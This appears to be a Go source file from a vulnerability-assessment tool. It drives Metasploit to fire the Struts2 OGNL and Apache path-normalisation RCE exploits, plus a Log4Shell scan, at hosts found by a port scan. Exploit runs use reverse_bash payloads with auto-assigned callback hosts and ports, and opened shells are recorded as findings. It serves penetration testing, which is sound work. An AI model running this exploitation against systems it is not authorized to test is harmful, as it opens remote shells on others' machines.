package service

import (
	"bufio"
	"context"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"

	"github.com/rikychoi/recon/internal/model"
)

// MSFModule은 실행할 Metasploit 모듈과 그에 연관된 취약점 메타데이터를 정의한다.
type MSFModule struct {
	Name     string  // 모듈 경로 (예: exploit/multi/http/struts2_content_type_ognl)
	CVE      string  // 연관 CVE 식별자 (있으면)
	CVSS     float64 // 연관 CVSS 점수 (알 수 없으면 0)
	Severity string  // 심각도 등급 (비면 CVSS로부터 추론)
	Port     int     // 대상 서비스 기본 포트(포트 정보가 없을 때 RPORT로 사용, 0이면 미설정)
	Payload  string  // 페이로드 모듈명(비면 모듈 기본 페이로드 사용, exploit 모듈에만 의미)
	Service  string  // 적합 서비스 키워드(예: "http"). 이 키워드를 포함하는 서비스 포트에만 실행. 비면 모든 포트.
	Product  string  // 적합 제품 키워드(예: "struts", "httpd"). nmap이 식별한 제품/CPE에 이 키워드가 포함될 때만 실행.
	//         제품 정보가 없으면(내장 스캐너 등) Service 키워드로 폴백한다. 비면 제품 조건 없음.
}

// DefaultMSFModules는 기본으로 실행할 실 CVE 점검 모듈 집합이다.
// 각 모듈은 대상에 대해 실제로 실행(run)되며, 긍정 결과([+]/세션)를 해당 CVE 취약점으로 기록한다.
// 대상 특성에 맞는 추가 모듈은 호출 측에서 등록할 수 있다.
var DefaultMSFModules = []MSFModule{
	// Struts2 OGNL RCE: nmap이 "struts"(제품/CPE)를 식별한 http 포트에만 실행한다.
	{Name: "exploit/multi/http/struts2_content_type_ognl", CVE: "CVE-2017-5638", CVSS: 9.8, Port: 8080, Payload: "cmd/unix/reverse_bash", Service: "http", Product: "struts"},
	// Apache httpd 경로 정규화 RCE: 제품이 "httpd"(Apache httpd)로 식별된 포트에만 실행한다(Tomcat 등 제외).
	{Name: "exploit/multi/http/apache_normalize_path_rce", CVE: "CVE-2021-41773", CVSS: 7.5, Port: 80, Payload: "cmd/unix/reverse_bash", Service: "http", Product: "httpd"},
	// Log4Shell: Log4j는 배너로 제품 식별이 어려워 제품 조건 없이 모든 http 포트를 스캔한다(auxiliary, 저위험).
	{Name: "auxiliary/scanner/http/log4shell_scanner", CVE: "CVE-2021-44228", CVSS: 10.0, Port: 8080, Service: "http"},
}

const (
	defaultMSFBaseLPort   = 4444 // exploit 모듈 콜백 LPORT 시작값(모듈마다 +1씩 부여)
	defaultMSFConcurrency = 4    // 모듈 병렬 실행 상한(동시 msfconsole 프로세스 수)
)

// MetasploitScanner는 msfconsole을 실행하여 취약점을 점검하는 VulnerabilityScanner 구현이다.
// 각 모듈에 대해 msfconsole 명령을 실행하며, exploit 모듈에는 LHOST와 고유 LPORT를 부여한다.
// 실행기(runner)로 공유 MSFSession을 주입하면 msfconsole을 프로그램당 1회만 부팅해 재사용한다.
type MetasploitScanner struct {
	binary      string      // msfconsole 경로 (기본 "msfconsole")
	runner      msfRunner   // msfconsole 실행기(기본 oneShotMSF, 공유 세션 주입 가능)
	modules     []MSFModule // 실행할 모듈 목록
	lhosts      []string    // 리버스 콜백을 받을 LHOST 후보(비면 로컬 IP 자동 감지)
	baseLPort   int         // LPORT 시작값
	concurrency int         // 모듈 동시 실행 상한(공유 세션 사용 시 세션이 직렬화)
	progress    io.Writer   // 진행 상황 출력 대상(nil이면 미출력)
	progressMu  sync.Mutex  // 병렬 실행 시 진행 로그 출력을 직렬화
}

// SetSession은 프로그램 수명 동안 유지되는 공유 msfconsole 세션을 실행기로 지정한다.
// 지정하면 모듈 실행이 매번 새로 부팅하지 않고 하나의 msfconsole에서 (세션이 직렬화하여) 이뤄진다.
func (m *MetasploitScanner) SetSession(sess msfRunner) {
	if sess != nil {
		m.runner = sess
	}
}

// SetProgress는 모듈별 진행 상황을 출력할 Writer를 지정한다(nil이면 미출력).
func (m *MetasploitScanner) SetProgress(w io.Writer) {
	m.progress = w
}

// SetLHosts는 리버스 콜백을 받을 LHOST 후보 목록을 지정한다(예: 사설 IP, 공인 IP).
// 지정하지 않으면 Scan 시 로컬(사설) IP를 자동 감지한다.
func (m *MetasploitScanner) SetLHosts(lhosts ...string) {
	m.lhosts = lhosts
}

// SetConcurrency는 모듈을 동시에 실행할 최대 개수를 지정한다(0 이하이면 무시).
func (m *MetasploitScanner) SetConcurrency(n int) {
	if n > 0 {
		m.concurrency = n
	}
}

// NewMetasploitScanner는 MetasploitScanner를 생성한다.
// binary가 비면 "msfconsole"을, modules가 비면 DefaultMSFModules를 사용한다.
func NewMetasploitScanner(binary string, modules ...MSFModule) *MetasploitScanner {
	if binary == "" {
		binary = "msfconsole"
	}
	if len(modules) == 0 {
		modules = DefaultMSFModules
	}
	return &MetasploitScanner{
		binary:      binary,
		runner:      oneShotMSF{binary: binary}, // 기본: 호출마다 부팅(폴백). 공유 세션은 SetSession으로 주입.
		modules:     modules,
		baseLPort:   defaultMSFBaseLPort,
		concurrency: defaultMSFConcurrency,
	}
}

// logf는 병렬 실행 중 진행 로그가 뒤섞이지 않도록 출력을 직렬화한다.
func (m *MetasploitScanner) logf(format string, a ...any) {
	m.progressMu.Lock()
	defer m.progressMu.Unlock()
	progressf(m.progress, format, a...)
}

// msfRun은 하나의 msfconsole 실행에 필요한 설정을 담는다.
// 값이 비어 있는(0인) 항목은 리소스 스크립트에서 설정을 생략하여 모듈 기본값을 따른다.
type msfRun struct {
	mod    MSFModule // 결과 귀속을 위한 모듈 메타데이터
	rhosts string    // 대상 호스트(공백 구분)
	rport  string    // 대상 포트(비면 모듈 기본값)
	lhost  string    // 리버스 콜백을 받을 공격자 IP(비면 미설정)
	lport  int       // 콜백 포트(0이면 미설정)
	total  int       // 진행 표시용 전체 작업 수
	index  int       // 진행 표시용 현재 작업 번호(0-based)
}

// buildResourceCommands는 msfRun 설정으로 msfconsole 명령 목록을 만든다.
// 명령을 문자열로 이어붙이지 않고 목록으로 반환한다(실행기가 -x는 "; ", 세션은 개행으로 조립).
func buildResourceCommands(r msfRun) []string {
	cmds := []string{"use " + r.mod.Name, "set RHOSTS " + r.rhosts}
	if r.rport != "" {
		cmds = append(cmds, "set RPORT "+r.rport)
	}
	if r.mod.Payload != "" {
		cmds = append(cmds, "set PAYLOAD "+r.mod.Payload)
	}
	if r.lhost != "" {
		cmds = append(cmds, "set LHOST "+r.lhost)
	}
	if r.lport > 0 {
		cmds = append(cmds, "set LPORT "+strconv.Itoa(r.lport))
	}
	// exit는 실행기가 관리한다.
	return append(cmds, "run")
}

// isExploitModule은 리버스/바인드 페이로드가 필요한 exploit 계열 모듈인지 판정한다.
func isExploitModule(name string) bool {
	return strings.HasPrefix(name, "exploit/")
}

// moduleMatchesPort는 모듈이 해당 포트에 적합한지(=이 포트에 실행할 취약점인지) 판정한다.
// 이 함수가 "서비스 인식 → 적용 취약점 매핑"의 핵심이다.
//
//  1. 제품 조건이 있는 모듈: nmap이 식별한 제품/CPE에 제품 키워드가 포함될 때만 적합하다.
//     예: Product "struts"는 제품 "Apache Struts"나 CPE "...:struts..."에만 일치한다.
//     → Apache/nginx 등 다른 제품 포트에는 실행하지 않아 오탐·소음을 줄인다.
//  2. 제품 정보가 없으면(내장 TCP 스캐너 등 -sV 미사용): 정밀 매칭이 불가하므로
//     Service 키워드로 폴백해 커버리지를 유지한다(정밀 매칭은 -nmap 사용 시).
//  3. 제품 조건이 없는 모듈: 기존대로 Service 키워드로만 판정한다.
func moduleMatchesPort(mod MSFModule, p model.Port) bool {
	if mod.Product != "" {
		detail := strings.ToLower(strings.TrimSpace(p.Product + " " + p.CPE))
		if detail != "" {
			return strings.Contains(detail, strings.ToLower(mod.Product))
		}
		// 제품 정보 없음 → Service 키워드 폴백(아래로 진행).
	}
	if mod.Service == "" {
		return true
	}
	return strings.Contains(strings.ToLower(p.Service), strings.ToLower(mod.Service))
}

// localOutboundIP는 외부로 나가는 경로의 로컬 IP(사설 IP 등)를 반환한다.
// 실제 패킷을 전송하지 않고 라우팅상 로컬 주소만 얻는다. 실패 시 빈 문자열을 반환한다.
func localOutboundIP() string {
	c, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return ""
	}
	defer c.Close()
	if addr, ok := c.LocalAddr().(*net.UDPAddr); ok {
		return addr.IP.String()
	}
	return ""
}

// portGroup은 같은 포트·서비스·제품을 가진 대상 호스트 묶음이다.
type portGroup struct {
	port    int        // 포트 번호(0이면 포트 정보 없음)
	service string     // 포트의 서비스명(예: http, ssh)
	sample  model.Port // 이 그룹의 대표 포트(제품/버전/CPE 등 매칭 근거)
	hosts   []string   // 이 포트가 열린 호스트 목록
}

// Scan은 설정된 각 모듈을 적합한 서비스 포트에 대해서만 실제로 실행(run)하고
// 긍정 결과를 CVE 취약점으로 수집한다. targets는 포트스캔이 식별한 열린 포트(서비스 포함)이며,
// 각 모듈은 Service 키워드가 일치하는 포트에만 실행된다(예: http 모듈은 http 계열 포트에만).
// 모듈 실행은 고루틴으로 병렬 처리하며(concurrency로 상한), exploit 모듈에는
// LHOST(자동 감지 또는 지정)와 모듈별 고유 LPORT를 부여해 리버스 콜백 충돌을 막는다.
func (m *MetasploitScanner) Scan(ctx context.Context, targets []model.Port) ([]model.Vulnerability, error) {
	if len(targets) == 0 || len(m.modules) == 0 {
		return nil, nil
	}

	// 동일한 (포트, 서비스, 제품, CPE)별로 호스트를 그룹화한다. Number 0은 포트 정보가 없는 대상이다.
	// 제품/CPE까지 키에 넣어, 같은 포트라도 제품이 다르면 별도로 매칭·실행되게 한다.
	type key struct {
		port             int
		service, product string
		cpe              string
	}
	grouped := make(map[key]*portGroup)
	var order []key
	for _, p := range targets {
		k := key{port: p.Number, service: p.Service, product: p.Product, cpe: p.CPE}
		g, ok := grouped[k]
		if !ok {
			g = &portGroup{port: p.Number, service: p.Service, sample: p}
			grouped[k] = g
			order = append(order, k)
		}
		g.hosts = append(g.hosts, p.Target)
	}

	// LHOST 후보: 지정값이 없으면 로컬(사설) IP를 자동 감지한다.
	lhosts := m.lhosts
	if len(lhosts) == 0 {
		if ip := localOutboundIP(); ip != "" {
			lhosts = []string{ip}
		}
	}

	// (모듈 × 적합 포트그룹 × LHOST) 조합으로 실행 작업을 만든다.
	// exploit 모듈은 LHOST 후보마다 고유 LPORT를 부여해 핸들러 포트 충돌을 막는다.
	var runs []msfRun
	lport := m.baseLPort
	addGroup := func(mod MSFModule, hosts []string, rport string) {
		rhosts := strings.Join(hosts, " ")
		if !isExploitModule(mod.Name) {
			runs = append(runs, msfRun{mod: mod, rhosts: rhosts, rport: rport})
			return
		}
		cands := lhosts
		if len(cands) == 0 {
			cands = []string{""} // LHOST 자동 감지 실패 시에도 모듈 기본값으로 1회 실행
		}
		for _, lh := range cands {
			runs = append(runs, msfRun{mod: mod, rhosts: rhosts, rport: rport, lhost: lh, lport: lport})
			lport++
		}
	}
	for _, mod := range m.modules {
		for _, k := range order {
			g := grouped[k]
			if g.port == 0 {
				// 포트 정보가 없는 대상은 모듈 기본 포트로 실행한다(서비스 필터 불가).
				defPort := ""
				if mod.Port > 0 {
					defPort = strconv.Itoa(mod.Port)
				}
				addGroup(mod, g.hosts, defPort)
				continue
			}
			if !moduleMatchesPort(mod, g.sample) {
				continue // 모듈이 적합하지 않은 포트는 건너뛴다(예: struts 모듈 vs Apache httpd 포트).
			}
			addGroup(mod, g.hosts, strconv.Itoa(g.port))
		}
	}

	// 작업을 고루틴 워커 풀로 병렬 실행하고 결과를 취합한다.
	var (
		mu    sync.Mutex
		vulns []model.Vulnerability
		wg    sync.WaitGroup
	)
	sem := make(chan struct{}, m.concurrency)
	for i := range runs {
		run := runs[i]
		run.index, run.total = i, len(runs)
		wg.Add(1)
		go func(run msfRun) {
			defer wg.Done()
			select {
			case sem <- struct{}{}:
				defer func() { <-sem }()
			case <-ctx.Done():
				return
			}
			if v := m.runTask(ctx, run); len(v) > 0 {
				mu.Lock()
				vulns = append(vulns, v...)
				mu.Unlock()
			}
		}(run)
	}
	wg.Wait()
	return vulns, nil
}

// runTask는 단일 msfconsole 실행을 수행하고 출력을 해당 모듈 메타데이터로 파싱한다.
// 개별 실행 실패(모듈 부재/네트워크 오류 등)는 nil을 반환하고 전체 점검은 계속된다.
func (m *MetasploitScanner) runTask(ctx context.Context, run msfRun) []model.Vulnerability {
	m.logf("    - [%d/%d] msf %s (CVE=%s RPORT=%s LPORT=%d) ...\n",
		run.index+1, run.total, run.mod.Name, run.mod.CVE, run.rport, run.lport)
	cmds := buildResourceCommands(run)
	// 실행기를 통해 실행한다. 공유 세션이면 하나의 msfconsole에서, 폴백이면 새 프로세스로 실행된다.
	out, err := m.runner.RunMSF(ctx, cmds)
	if err != nil {
		return nil
	}
	return parseMSFOutput(strings.NewReader(out), run.mod)
}

// parseMSFOutput은 msfconsole 출력에서 [+] 긍정 결과 줄을 취약점으로 변환한다.
// 실행 로직과 분리하여 단위 테스트가 가능하도록 별도 함수로 둔다.
func parseMSFOutput(r io.Reader, mod MSFModule) []model.Vulnerability {
	var vulns []model.Vulnerability
	sc := bufio.NewScanner(r)
	sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		// 취약 판정: [+] 긍정 결과 줄, 또는 익스플로잇 성공으로 세션이 열린 줄.
		positive := strings.HasPrefix(line, "[+]") || isSessionOpened(line)
		if !positive {
			continue
		}
		msg := strings.TrimSpace(strings.TrimPrefix(line, "[+]"))

		severity := mod.Severity
		if severity == "" {
			severity = model.SeverityFromCVSS(mod.CVSS)
		}
		id := mod.CVE
		if id == "" {
			id = mod.Name
		}
		vulns = append(vulns, model.Vulnerability{
			ID:       id,
			Name:     msg,
			Target:   extractMSFTarget(msg),
			CVSS:     mod.CVSS,
			Severity: severity,
			Source:   "metasploit",
		})
	}
	return vulns
}

// isSessionOpened는 익스플로잇 성공으로 세션이 열린 msfconsole 로그 줄인지 판정한다.
// 예: "[*] Command shell session 1 opened (...)", "Meterpreter session 2 opened".
func isSessionOpened(line string) bool {
	l := strings.ToLower(line)
	return strings.Contains(l, "session") && strings.Contains(l, "opened")
}

// extractMSFTarget은 msfconsole 결과 줄에서 대상 host:port를 추출한다.
// 예: "10.0.0.1:80 - Vulnerable ..." → "10.0.0.1:80"
func extractMSFTarget(msg string) string {
	if i := strings.Index(msg, " - "); i > 0 {
		return strings.TrimSpace(msg[:i])
	}
	if f := strings.Fields(msg); len(f) > 0 {
		return f[0]
	}
	return ""
}
